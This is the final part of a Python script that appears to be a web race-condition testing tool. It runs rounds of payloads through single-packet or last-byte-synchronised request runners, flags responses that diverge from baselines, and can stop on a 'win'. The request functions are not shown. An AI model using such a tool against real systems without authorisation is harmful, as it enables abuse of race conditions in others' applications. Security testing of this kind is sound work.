    signal.signal(signal.SIGINT, bail)
    signal.signal(signal.SIGTERM, bail)

    res, lk = [], threading.Lock()
    runner = spa if a.spa else h1_lastbyte
    rounds_info = []

    for i in range(1, a.r + 1):
        payload = payloads[(i - 1) % len(payloads)]
        print(f"{C}[-] Round {i}/{a.r}{X} | payload={json.dumps(payload)[:40]}")
        start = len(res)
        try:
            dt = runner(a, res, lk, ckl, payload, i)
            rr = res[start:]
            info = summarize(rr, baselines.get(_pkey(payload), {}))
            info["round"] = i
            info["wall"] = dt
            rounds_info.append(info)

            if info["div"] == DIV_FAILED:
                msg = f"FAILED (no 2xx)"
                if info["partial"]: msg += f", {info['partial']} partial"
                print(f"    {R}{msg}{X}\n")
            elif info["div"] == DIV_UNKNOWN:
                print(f"    {Y}UNKNOWN (no baseline){X}\n")
            elif info["div"] > 0:
                print(f"    {R}DIVERGENT ({info['div']}){X}\n")
                if a.stop_on_win: break
            else:
                extra = f"  ({info['partial']} partial)" if info["partial"] else ""
                print(f"    {G}clean{X}{extra}\n")
        except Exception as e:
            print(f"    {R}Error: {e}{X}\n")
            rounds_info.append({"round": i, "div": DIV_FAILED, "ok": 0, "bad": 0, "err": 0, "total": 0})

    rc = report(res, baselines, payloads, a, rounds_info)
    sys.exit(rc)

if __name__ == "__main__":
    main()
